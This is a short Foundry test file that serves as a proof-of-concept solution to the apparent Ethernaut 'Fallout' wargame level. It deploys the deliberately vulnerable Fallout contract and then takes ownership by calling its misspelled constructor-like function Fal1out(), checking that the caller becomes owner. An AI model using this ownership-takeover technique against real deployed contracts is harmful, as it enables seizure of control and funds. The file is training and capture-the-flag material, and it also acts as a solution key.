pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";


contract Fallout_POC is Test {
    Fallout _fallout;
    function init() private{
        vm.startPrank(address(0x1));
        _fallout =new Fallout();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Fallout_POC() public{
        _fallout.Fal1out();
        bool success = _fallout.owner() == address(this);
        console.log("success:",success);
    }
}

